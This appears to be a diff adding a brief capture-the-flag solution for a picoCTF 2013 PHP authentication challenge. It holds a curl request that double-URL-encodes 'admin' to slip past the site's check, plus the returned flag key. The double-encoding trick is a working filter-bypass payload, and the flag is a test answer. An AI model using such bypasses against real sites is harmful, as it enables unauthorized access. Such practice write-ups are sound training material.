@@ -1,0 +1,6 @@
+$ curl "https://2013.picoctf.com/problems/php2/?id=%2561dmin"
+<p>Access granted!</p><p>Key: b4cc845aa05ed9b0ce823cb04f253e27 </p>
+
+<br><br>
+Can you authenticate to this website?
+<!-- source: index.phps -->
